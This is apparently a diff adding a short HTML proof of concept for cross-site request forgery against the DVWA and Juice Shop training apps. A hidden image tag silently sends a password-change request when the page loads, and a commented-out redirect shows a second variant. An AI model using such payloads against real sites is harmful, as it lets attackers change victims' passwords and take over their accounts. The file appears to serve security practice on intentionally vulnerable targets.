@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Attack Example</title>
+</head>
+<body>
+    <img src="http://localhost/DVWA/vulnerabilities/csrf/?password_current=password&password_new=12345&password_conf=12345&Change=Change#" alt="CSRF Attack" style="display:none;">
+    <script>
+        // Alternatively, you can redirect the user to the malicious URL
+        // window.location.href = "https://juice-shop.herokuapp.com/rest/user/change-password?current=123456&new=qwert&repeat=qwert";
+    </script>
+</body>
+</html>
